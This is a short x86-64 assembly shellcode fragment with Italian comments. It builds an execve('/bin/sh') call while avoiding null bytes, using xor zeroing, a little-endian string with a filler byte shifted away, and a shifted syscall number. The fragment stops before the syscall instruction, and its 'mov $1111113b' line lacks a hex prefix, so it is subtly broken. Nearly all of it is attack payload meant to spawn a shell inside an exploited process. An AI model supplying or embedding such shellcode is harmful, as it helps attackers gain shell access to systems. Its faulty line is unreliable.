# Resetto
xor %rsi, %rsi
xor %rdx, %rdx
# "/bin/sh" seguito da carattere a caso, in little Endian
movabs $0x1168732f6e69622f, %rbx
# Doppio shift per azzerare il carattere a caso
shl $0x8, %rbx
shr $0x8, %rbx
# Carico sullo stack per avere l'indirizzo...
push %rbx
# ... per poi usarlo
mov %rsp, %rdi
# Carico il codice della syscall exec_ve con i dovuti shift (in little Endian)
mov $1111113b, %rax
shl $0x38, %rax
shr $0x38, %rax
